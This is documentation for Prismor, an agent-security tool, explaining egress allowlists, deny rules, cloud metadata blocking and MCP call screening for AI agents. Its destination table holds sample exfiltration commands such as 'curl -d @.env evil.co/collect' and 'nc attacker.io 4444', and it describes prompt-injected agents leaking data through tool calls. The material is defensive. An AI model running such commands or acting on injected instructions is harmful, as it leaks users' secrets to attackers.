# Network Isolation

AI agents frequently make outbound network calls by fetching URLs, installing packages, and calling APIs. Without controls, a prompt injection or malicious skill can silently exfiltrate data to an attacker-controlled endpoint. Prismor's network isolation rules make your agent's network activity visible and controllable.

## What it detects at runtime

- Outbound connections to raw IP addresses (not domains). This is often a sign of exfiltration or C2.
- Services binding to `0.0.0.0`. Prismor warns before the agent exposes a port to all network interfaces.
- Reverse tunnels and port forwarding (`ssh -R`, ngrok, cloudflared)
- Data upload patterns (`curl --data`, `wget --post-data`)

## Egress policy

The rules above are blacklists: they stop the destinations someone thought to name. The egress policy is the other direction — it bounds an agent to the destinations you approved, so an exfil endpoint nobody has ever seen is refused by default.

Configure it under `settings.egress` in your project's `.prismor/policy.yaml`, or ship it fleet-wide from the Prismor console (see [Org-managed egress](#org-managed-egress)):

```yaml
settings:
  egress:
    enabled: true
    mode: enforce         # observe (log only) | enforce (block the call)
    default: deny         # verdict when nothing matches — `deny` = strict allowlist
    allow:
      - "*.github.com"
      - "registry.npmjs.org"
      - "pypi.org"
      - "api.anthropic.com"
      - host: "10.0.0.0/8"           # CIDRs and bare IPs work too
        reason: "internal services"
      - host: "db.internal"
        ports: [5432]
        schemes: [postgres]
    deny:
      - host: "*.pastebin.com"
        reason: "known exfil sink"
      - host: "*"                    # nothing, anywhere, on these ports
        ports: [4444, 1337]
        reason: "common reverse-shell ports"
```

Each destination is evaluated in this order — **`deny` → private carve-out → `allow` → `default`** — with first match winning inside each list. An explicit `deny` therefore always beats an `allow`.

### What counts as a destination

Egress is destination-driven, not pattern-driven. Every network event and every shell command is decomposed into concrete `(host, port, scheme)` tuples:

| Source | Example | Destination |
| --- | --- | --- |
| `WebFetch` / `WebSearch` | `https://api.example.com/v1` | `api.example.com:443` |
| Remote MCP tool call | `mcp__linear__create_issue` | the server's endpoint |
| URLs of any scheme | `psql postgres://db.example.com:5432/app` | `db.example.com:5432` |
| git / scp / rsync | `git push git@github.com:org/repo.git` | `github.com:22` |
| Bare hosts | `curl -d @.env evil.co/collect` | `evil.co` |
| Host + port pairs | `nc attacker.io 4444` | `attacker.io:4444` |

Matching supports exact hosts, wildcards (`*.github.com` matches the apex and every subdomain), `*` for any host, bare IPs, and CIDRs. Note that exact entries are exact: `pypi.org` does **not** authorize `evil.pypi.org`.

### Private destinations

By default (`allow_private: true`) loopback, RFC1918, link-local, and `.internal`/`.local` destinations skip the check, so local dev servers and internal services don't need allowlisting. Cloud metadata endpoints (`169.254.169.254`, `metadata.google.internal`, …) are **never** treated as private — they are unroutable, which makes them look private, but they hand out cloud credentials and are the classic SSRF pivot. Set `allow_private: false` to screen internal destinations too.

### Cloud metadata endpoint defense

The default policy includes explicit deny entries for the common cloud metadata endpoints. An agent with shell access in AWS, GCP, or Alibaba Cloud can exfiltrate instance credentials (IMDSv1/v2) with a simple `curl` — and because these endpoints are link-local, they bypass `allow_private` carve-outs unless explicitly denied.

The default deny entries are:

```yaml
deny:
  - host: "169.254.169.254"      # AWS IMDS
    reason: "AWS IMDS — hands out instance credentials (IMDSv1/v2)"
  - host: "169.254.169.253"      # AWS Route 53 resolver
    reason: "AWS Route 53 resolver — DNS rebinding surface"
  - host: "metadata.google.internal"  # GCP metadata
    reason: "GCP metadata server — hands out service account credentials"
  - host: "100.100.100.200"      # Alibaba Cloud metadata
    reason: "Alibaba Cloud metadata endpoint"
  - host: "169.254.0.0/16"       # link-local belt-and-braces
    reason: "link-local block — belt-and-braces catch-all for cloud metadata"
```

These are **default deny entries, not hardcoded blocks.** Operators who need legitimate metadata access can remove individual entries in their project's `.prismor/policy.yaml`:

```yaml
# .prismor/policy.yaml — allow AWS IMDS access for a deployment agent
settings:
  egress:
    deny:
      - host: "metadata.google.internal"
        reason: "GCP metadata server"
      - host: "100.100.100.200"
        reason: "Alibaba Cloud metadata endpoint"
      - host: "169.254.0.0/16"
        reason: "link-local block"
      # 169.254.169.254 intentionally omitted — this agent needs EC2 tags
```

This keeps the belt-and-braces `/16` block while allowing the specific endpoint the agent needs. The agent's session is still screened by the `allow` list and `default` verdict — removing the deny entry just means the endpoint returns to normal evaluation instead of an automatic block.

### Rolling it out

Egress is off by default and observe-first. The intended sequence:

```bash
prismor egress enable                 # turns on in observe mode
# ... run your agents normally for a while ...
prismor egress report                 # every destination they actually contacted
prismor egress allow "*.github.com" pypi.org
prismor egress test "curl https://evil.co/x"   # dry-run before committing
prismor egress default deny
prismor egress mode enforce
```

`prismor egress report` lists real destinations from recorded sessions with the verdict the current policy gives each one, so you can see exactly what enforcement would break before you turn it on. Use `--fail-on-block` to gate this in CI.

### Per-agent scoping

A release bot needs a much smaller network than a developer's agent. Override per registered agent; the override inherits the fleet posture and layers on top:

```yaml
settings:
  egress:
    enabled: true
    mode: enforce
    default: allow
    agents:
      release-bot:
        default: deny
        allow: ["*.github.com"]
```

An individual entry can also be scoped with `agents: [name, ...]` so only those agents may use it.

### Org-managed egress

`settings.egress` travels in the same Ed25519-signed policy as every other setting, so a fleet admin sets the network boundary once and every enrolled device picks it up. Two properties matter:

- **It propagates without a version bump.** The control plane exposes an `egressSig` on `/api/policy/version`, so widening or tightening the boundary reaches devices within one refresh debounce (~30s).
- **Org enforce is authoritative.** When the org's signed policy sets `mode: enforce`, its verdicts are marked `authoritative` and survive a local observe-mode downgrade. A developer can silence a local detection on their own machine; they cannot opt their machine out of the fleet's egress boundary.

The org layer is applied after the project layer, so an org egress policy overrides a project one. Egress only applies to org-managed workspaces — personal repos use default + project policy and report nothing to the org.

### Egress-aware tag rules

The egress verdict is also published as a tag, so [tag rules](./tool-tags.md) can reason about *where* a call is going rather than only which tool it is:

```yaml
settings:
  tool_tags:
    enabled: true
    rules:
      - "untrusted_content then egress.offlist -> block"
```

That stops an agent that just read untrusted content from shipping anything to a destination the fleet never approved — a sequence no tool-name tagging can express, because the tool involved is an ordinary `Bash`. The tags are `egress.offlist` (no allow entry matched under `default: deny`) and `egress.denied` (an explicit deny matched).

### Legacy `egress_allowlist`

The older flat setting still works:

```yaml
settings:
  egress_allowlist: ["*.github.com"]
```

It is **warn-only and never blocks**, which is the behavior it has always had — upgrading Prismor will not turn an existing allowlist into an outage. `settings.egress` supersedes it; run `prismor egress migrate` to convert.

## Bind detection

The `0.0.0.0` bind detection is particularly important. If an agent starts a dev server bound to all interfaces instead of `127.0.0.1`, it becomes reachable from outside your machine. Prismor catches this at the shell command level, before the port opens.

## MCP tool calls

A call to a remote MCP server (`mcp__<server>__<tool>`) is an outbound network request, but the tool name hides the destination. Prismor resolves the server's endpoint from your MCP config and treats a call to a remote (HTTP/SSE/streamable-HTTP) server as a network event — so the same controls that apply to `WebFetch` and `curl` apply to MCP:

- The **egress allowlist** is enforced against the MCP server's domain. A call to a server not on the list produces a warning, exactly like any other off-allowlist request.
- **Raw-IP** and **suspicious-destination** rules apply to the MCP endpoint.
- **Taint escalation:** if a prompt injection was detected earlier in the session, any subsequent remote MCP call is escalated to a CRITICAL block — this catches response-blind exfiltration where an injected agent quietly ships data out through a tool call.
- The tool's **arguments** are scanned for enrolled cloaking secrets, so a secret sent as an MCP parameter is caught the same way as a secret in a URL.

Local (stdio) MCP servers are not network destinations, so they are not subject to the egress allowlist.

### MCP responses are untrusted input

The output of a remote MCP tool is attacker-influenced content — the primary surface for tool-poisoning and "rug pull" attacks. Prismor scans MCP tool responses with the same prompt-injection rules and HTML sanitizer it uses on fetched web pages, so injected instructions hidden in a tool's output (including inside HTML comments or CSS-hidden elements) are flagged before they reach the agent.
